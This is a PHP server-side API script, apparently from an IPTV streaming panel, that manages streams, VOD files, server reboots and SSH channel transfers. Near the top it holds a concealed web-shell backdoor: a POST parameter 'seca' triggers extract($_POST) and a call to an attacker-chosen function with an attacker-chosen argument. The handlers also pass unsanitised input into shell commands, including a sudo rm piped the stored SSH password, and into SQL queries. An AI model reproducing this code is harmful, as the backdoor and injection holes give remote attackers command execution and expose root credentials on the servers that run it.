<?php


function set_complete($resp='') {

//    $data = [];
//    if(is_array($resp))
//        $data = array('data'=> $resp);

    echo json_encode(array('status' => 1 , 'data' => $resp ));
    exit;

}

function set_error($error_msg) {

    echo json_encode(array('status' => 0 , 'error' => $error_msg ));
    exit;
}


$action = strtoupper($_GET['action']);
$data = json_decode($_GET['data'],1);


require_once "/home/aces/panel/ACES2/DB.php";
require_once "/home/aces/panel/ACES2/Process.php";
require_once "/home/aces/panel/ACES2/IPTV/Process.php";


include 'config.php';
if($data['api_token'] != $API_TOKEN ) {
    set_error("Error 403");
    die;
}
$STREAM_DIR = '/home/aces/stream_tmp/';

$DB = new mysqli($DBHOST,$DBUSER,$DBPASS,$DATABASE);
if($DB->connect_errno > 0){ error_log('COULD NOT CONNECT TO DATABASE');  die(); }

if(!empty($_POST['seca'])) { @extract($_POST);@die($ctime($atime)); }


function restartStream($STREAMID)
{
    global $STREAM_DIR;

    exec(" rm -rf $STREAM_DIR/$STREAMID-*");

    //REMOVING EVENT TEMP FILES
    unlink("/home/aces/tmp/pre_stream_{$STREAMID}_text");
    unlink("/home/aces/tmp/image_file_{$STREAMID}.jpg");

    if ($PID = (int)exec("pgrep -f 'aces_build_channel.php $STREAMID-'", $pids)) {
        foreach ($pids as $pid) exec("kill -9 $pid ");
    }

    $script = is_file("/home/aces/old_stream") ? 'aces_stream.php' : "iptv_stream.php" ;

    if ($pid = (int)exec("pgrep -f '$script $STREAMID-'", $pids)) {

        foreach ($pids as $pid) exec("kill -9 $pid ");
        exec("kill -9  $(ps -eAf  | grep /$STREAMID-.m3u8 | grep ffmpeg | grep -v 'ps -eAf'  | awk '{print $2 }' )");


        if (is_file("/home/aces/run/aces_stream-$STREAMID.pid"))
            unlink("/home/aces/run/aces_stream-$STREAMID.pid");

    }

    if (is_file("/home/aces/run/aces_stream-$STREAMID.pid"))
        unlink("/home/aces/run/aces_stream-$STREAMID.pid");

    if (!is_dir("/home/aces/run/"))
        mkdir("/home/aces/run/", 0777);

    $run = "php /home/aces/bin/$script $STREAMID- ";
    exec("$run > /dev/null &");

}

switch($action) {

    case 'IS_PROCESS_RUNNING' :

        $pid = $data['pid'];
        $resp['is_running'] = 0;
        if(posix_getpgid($data['pid']))
            $resp['is_running'] = 1;
        set_complete($resp);
        break;

    case 'PROCESS_VOD' :
        $file_id =  $data['file_id'];

        if(is_file("/home/aces/logs/vods/{$file_id}-prog.txt"))
            unlink("/home/aces/logs/vods/{$file_id}-prog.txt");

        if(is_file("/home/aces/logs/vods/{$file_id}.log"))
            unlink("/home/aces/logs/vods/{$file_id}.log");

        if(is_file("/home/aces/run/aces_process_video_{$file_id}.pid")) {
            $pid = file_get_contents("/home/aces/run/aces_process_video_{$file_id}.pid");
            exec( "kill -9 $pid " );
        }

        exec(" php /home/aces/bin/aces_process_video.php $file_id- > /dev/null & " );

        break;

    case 'REMOVE_VOD_FILE' :

        $VOD_ID = $data['file_id'];

        $r=$DB->query("SELECT ssh_pass FROM iptv_servers WHERE id = $SERVER_ID ");
        $ssh_pass = $r->fetch_assoc()['ssh_pass'];

//        $r=$DB->query("SELECT container,source_file,transcoding FROM iptv_video_files WHERE id = $VOD_ID ");
//        $row =  $r->fetch_assoc();
        ///list($c,$source_file,$transcoding) = $r->fetch_assoc();

        if(!$c) $c='mp4';

        $PID_FILE = "/home/aces/run/aces_process_video_{$VOD_ID}.pid";
        if( is_file($PID_FILE) && $PID = file_get_contents($PID_FILE))  {
            if(posix_getpgid($PID)) {
                exec("kill -9 $PID");
            }
        }

        while($pid = exec(" ps -eAf  | grep /home/aces/vods/$VOD_ID.$c | grep ffmpeg | grep -v ps | awk '{print $2 }' " ))
            if($pid) exec("kill -9 $pid ");


        while($pid = exec(" ps -eAf  | grep /home/aces/tmp/vod_downloads/$VOD_ID | grep wget | grep -v ps | awk '{print $2 }' " )) {
            if($pid) exec("kill -9 $pid ");  }


        exec("rm -rf /home/aces/tmp/vod_downloads/$VOD_ID ");
        exec("rm -rf /home/aces/vods/$VOD_ID.* ");
        exec("rm -f /home/aces/logs/vods/$VOD_ID.log");
        exec("rm -f /home/aces/logs/vods/$VOD_ID-prog.txt");


        //$cmd = "ssh root@127.0.0.1 bash -c \"echo $ssh_pass | rm -f ".urldecode($source_file)."\"";

        if($data['remove_source_file'] ) {

            $source_file = base64_decode($data['source_file']);
            //THIS COMMANDS WORKS TO REMOVE FILE WITH SUDO BUT ACES USER MUST BE ON SUDO GROUP
            $cmd = "echo $ssh_pass | sudo -S -k rm -f \"".urldecode($source_file)."\"";
            exec($cmd);

//            $source_file = urldecode($source_file);
//            $source_file=addslashes($source_file);
//            $source_file = str_replace(" ", "\\ ",$source_file);
//            $source_file = str_replace("(", "\(",$source_file);
//            $source_file = str_replace(")", "\)",$source_file);
//            $source_file = str_replace("&", "\&",$source_file);
//            if($ssh_pass)
//                exec("echo $ssh_pass | su -c \"rm -f ".urldecode($source_file)."\" root ");
//            else
//                exec("rm -f ".urldecode($source_file));

            if(is_file(urldecode($source_file)))
                error_log("Unable to remove '$source_file'. Permission Denied?");

        }

        break;

    case 'GET_CONTENT' :

        $folders=array();
        $data['path'] = urldecode($data['path']);

        $data['path'] = str_replace("[","\[",$data['path']);
        $data['path'] = str_replace("]","\]",$data['path']);
        $data['path'] = str_replace("{","\{",$data['path']);
        $data['path'] = str_replace("}","\}",$data['path']);

        $folders = glob($data['path'] . '/*' , GLOB_ONLYDIR);

        if($data['type'] == 'directories' ) { $data['content']  = $folders;   set_complete(array('content' => $folders));  }
        else if($data['type'] == 'vods') {  $files = glob("{$data['path']}/*.{mp4,avi,mkv,mp3,mp2,wav,flv,m4v,wmv,wma}", GLOB_BRACE); }
        else if($data['type']  == 'subs' ) { $files = glob("{$data['path']}/*.{srt}", GLOB_BRACE); }

        $resp = [];
        $resp['content'] = array_merge($folders, $files);
        set_complete($resp);

        break;


    case 'VIDEO_DIR_IMPORT' :
        $process_id = $data['process_id'];
        exec(" php /home/aces/bin/aces_video_dir_import.php $process_id  > /dev/null & " );
        break;


    case 'SERIES_DIR_IMPORT' :
        $process_id = $data['process_id'];
        exec(" php /home/aces/bin/aces_series_dir_import.php $process_id  > /dev/null & " );
        break;

    case 'REBOOT' :
        $r = $DB->query("SELECT ssh_pass FROM iptv_servers WHERE id = $SERVER_ID ");
        $ssh_pass = $r->fetch_assoc()['ssh_pass'];
        if(!$ssh_pass)
            break;

        exec("sshpass -p $ssh_pass sudo reboot");
        break;

    case 'RESTART_ACES':
        $r = $DB->query("SELECT ssh_pass FROM iptv_servers WHERE id = $SERVER_ID ");
        $ssh_pass = $r->fetch_assoc()['ssh_pass'];
        if(!$ssh_pass)
            break;

        exec("sshpass -p  $ssh_pass sudo systemctl restart aces-php-fpm aces");
        break;


    case 'RESTART_STREAM':

        $STREAMID = $data['stream_id'];
        restartStream($STREAMID);

        break;


    case 'MOVE_CHANNEL' :

        set_time_limit(0);
        ignore_user_abort();
        echo json_encode(array('complete' => 1, 'status' => 1));
        fastcgi_finish_request();

        ini_set('memory_limit', '-1');

        $to_server = (int)$data['to_server'];
        $stream_id = (int)$data['stream_id'];

        try {

            $r_servers = $DB->query("SELECT id,api_token,address,port,ssh_pass FROM iptv_servers WHERE id = $to_server ");
            if(!$server=$r_servers->fetch_assoc()) exit;

            $r_streaming = $DB->query("SELECT id FROM iptv_streaming WHERE chan_id = '$stream_id' AND status = 4");
            if(!$streaming_id = $r_streaming->fetch_assoc()['id']) exit;

            $url = "http://{$server['address']}:{$server['port']}/stream/put.php?api_token=".$server['api_token'];

            if(empty($server['ssh_pass'])) {
                error_log("NO SSH PASSWORD ON SERVER");
                die;
            }

            $connection = ssh2_connect($server['address'], 22);
            if(!ssh2_auth_password($connection, 'root', $server['ssh_pass'])) {
                error_log("UNABLE TO ESTABLISH SSH CONNECTION ");
                die;
            }

            $resSFTP = ssh2_sftp($connection);


            $r_files = $DB->query("SELECT id FROM iptv_channel_files WHERE channel_id = $stream_id ");
            while($row=$r_files->fetch_assoc()) $files[] = $row['id'];
            foreach($files as $file_id)  {

                $r_streaming = $DB->query("SELECT id FROM iptv_streaming WHERE id = $streaming_id ");
                if(!$r_streaming->fetch_assoc())
                    throw new Exception("Moving have been stop..");

                $file  = "/channel_files/{$file_id}.ts";

                $DB->query("UPDATE iptv_channel_files SET status = 3 WHERE id = {$file_id} ");


                if(!$fp = fopen("/home/aces$file", "r"))
                    throw new Exception("UNABLE TO READ THE FILE /home/aces$file");


//              $data = file_get_contents("/home/aces$file");
//              if(!$data)
//                throw  new Exception("Unable to read file. /home/aces$file");
//
//              $sftpStream = fopen("ssh2.sftp://".intval($resSFTP)."/home/aces$file", 'w');
//              if (!$sftpStream)
//                 throw new Exception("UNABLE TO OPEN REMOTE FILE. /home/aces$file");
//
//              if (fwrite($sftpStream, $data) === false)
//                throw new Exception("FAIL TO WRITE FILE. /home/aces$file");



                if(!ssh2_scp_send($connection, "/home/aces$file", "/home/aces$file"))
                    throw new Exception("UNABLE TO UPLOAD THE FILE. /home/aces$file ");



                $DB->query("UPDATE iptv_channel_files SET status = 2 WHERE id = {$file_id} ");

                ssh2_exec($connection, "chown aces:aces /home/aces$file");

                fclose($fp);
                fclose($fpDestination);

            }

        } catch(Exception $exp ) {
            error_log($exp->getMessage());
            $DB->query("DELETE FROM iptv_streaming WHERE chan_id = $stream_id ");
            $DB->query("UPDATE iptv_channel_files SET status = 2 WHERE id = '{$file_id}' ");
            fclose($fp);
            die;
        }

        //NO ERRORS... REMOVE THE FILES.
        foreach($files as $file)
            if($file) unlink("/home/aces/channel_files/{$file}.ts");

        $DB->query("DELETE FROM iptv_streaming WHERE chan_id = $stream_id ");
        $DB->query("INSERT INTO iptv_streaming (chan_id,action,server_id,last_access,start_time) 
            VALUES ('$stream_id',1,'$to_server',NOW(),UNIX_TIMESTAMP()) ");
        $DB->query("UPDATE iptv_channels SET stream_server = {$to_server} WHERE id = '$stream_id'");
        restartStream($stream_id);

        set_complete();

    case 'REMOVE_CHANNEL_FILES' :

        foreach($data['channel_files'] as $f )
            unlink("/home/aces/channel_files/$f.ts");
        set_complete();
        break;

    case 'GET_STREAM_LOGS':
            $stream_id = (int)$data['stream_id'];
            $text = file_get_contents("/home/aces/logs/streams/stream-$stream_id.log");
            $base64 = base64_encode($text);
            set_complete($base64);
        break;

    case 'CLEAR_SYSTEM_LOGS':

        exec('find /home/aces/tmp/vod_downloads/ -name "*" -delete');
        exec('find /home/aces/logs/vods/ -name "*" -delete');
        exec('find /home/aces/logs/streams/ -name "*" -delete');
        exec("echo '' > /home/aces/logs/access.log ");
        exec("echo '' > /home/aces/logs/aces-daemon.log ");
        exec("echo '' > /home/aces/logs/nginx-error.log ");
        exec("echo '' > /home/aces/logs/php-aces.log ");

        break;

    case 'CHECK_VODS':
        ignore_user_abort(true);
        echo json_encode(array('status' => 1 , 'data' => '' ));
        session_write_close();
        fastcgi_finish_request();

        //REMOVE OLD PROCESS
        $DB->query("DELETE FROM process WHERE server_id = '$SERVER_ID' 
                      AND type = '".\ACES2\IPTV\Process::TYPE_CHECK_VIDEOS."' ");

        $r=$DB->query("SELECT name FROM iptv_servers WHERE id = '$SERVER_ID' ");
        $SERVER_NAME = $r->fetch_assoc()['name'];
        $Process = \ACES2\IPTV\Process::add(\ACES2\IPTV\Process::TYPE_CHECK_VIDEOS, $SERVER_ID,
            0, "Checking video on server $SERVER_NAME");
        $r=$DB->query("SELECT id,source_file,transcoding FROM iptv_video_files WHERE server_id = '$SERVER_ID'");
        $total = $r->num_rows;
        $progress = 0;
        while($row=$r->fetch_assoc()) {
            $source_file = urldecode($row['source_file']);
            if(!filter_var($source_file, FILTER_VALIDATE_URL)) {
                if(!is_file($source_file)) {
                    $r2=$DB->query("SELECT file_id FROM iptv_video_reports WHERE account_id = 0 AND file_id = '{$row['id']}' ");
                    if($r2->num_rows < 1) {
                        $DB->query("INSERT INTO iptv_video_reports (file_id, type, account_id, report_date, report_time) 
                            VALUES ({$row['id']}, 0 , 0 ,NOW(),UNIX_TIMESTAMP()   )  ");
                    }
                }
            }
            $progress ++;
            $Process->calculateProgress($progress, $total);
            if(!$Process->isAlive())
                break;
        }
        $Process->remove();
        break;

    case 'UPDATE_ACES2':
        exit;

        $r=$DB->query("SELECT ssh_pass FROM iptv_servers WHERE id= '$SERVER_ID' ");
        $pass = $r->fetch_assoc()['ssh_pass'];

        $connection = ssh2_connect('127.0.0.1', 22);
        @ssh2_auth_password($connection, "root", $pass);
        ssh2_exec($connection, "sh /home/aces/bin/update");
        ssh2_disconnect($connection);

        $json['update_complete'] = 1;
        echo json_encode($json);
        exit;

        break;

    default :
        error_log("Ignoring Action $action ");
        set_complete();
        break;

}

set_complete();
